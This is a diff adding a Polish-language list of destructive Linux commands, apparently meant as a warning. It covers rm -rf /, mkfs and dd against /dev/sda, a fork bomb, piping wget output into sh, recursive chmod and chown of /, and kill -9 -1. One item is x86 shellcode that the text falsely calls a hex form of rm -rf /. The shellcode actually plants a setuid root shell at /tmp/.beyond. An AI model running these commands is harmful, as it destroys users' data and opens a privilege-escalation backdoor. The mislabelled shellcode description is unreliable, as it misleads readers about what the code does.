@@ -1,0 +1,69 @@
+1. Kod:
+
+rm -rf /
+
+Ta komenda skasuje wszystkie pliki w katalogu roota / (rekursywnie i siłowo)
+
+2. Kod:
+
+char esp[] __attribute__ ((section(".text"))) /* e.s.p
+release */
+= "\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68"
+"\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99"
+"\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7"
+"\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56"
+"\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31"
+"\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69"
+"\x6e\x2f\x73\x68\x00\x2d\x63\x00"
+"cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;";
+
+A to szesnastkowa versja komendy nr 1 [rm -rf /], która może zaskoczyć nawet doświadczonego konsolowca…
+
+3. Kod:
+
+mkfs.ext3 /dev/sda
+
+To polecenie ponownie sformatuje lub wymaże wszystkie pliki z woluminu wymienionego po komendzie mkfs.
+
+4. Kod:
+
+:(){:|:&};:
+
+To polecenie nakaże twojemu systemowi wykonanie olbrzymiej ilości procesów aż do zawieszenia. może też doprowadzić do 
+
+uszkodzenia danych.
+
+5. Kod:
+
+any_command > /dev/sda
+
+Surowe dane zostaną zapisane do wskazanego urządzenia (tu: sda), co doprowadzi do uszkodzenia systemu plików i utraty danych.
+
+6. Kod:
+
+wget http://some_untrusted_source -O- | sh
+
+Nigdy nie ściągaj z niepewnych źródeł i nie wykonuj kodu, który może być złośliwy.
+
+7. Kod:
+
+mv /home/yourhomedirectory/* /dev/null
+
+Ta komenda przeniesie wszystkie dane z katalogu domowego do miejsca, które nie istnieje. Więc pliki wpadają w czarną dziurę:(
+
+
+-------------------
+dd if=/dev/urandom of=/dev/sda
+------------------
+chmod -R 777 /
+
+Recursively gives read, write, and execute priviledges to all users for all files. The files in /bin and /etc/bin cannot have this mode or they will not run.
+-----------------
+chown nobody:nobody -R /
+chmod 000 -R /
+-----------------
+or to kill all process in the system
+
+#kill -9 -1
+----------------------
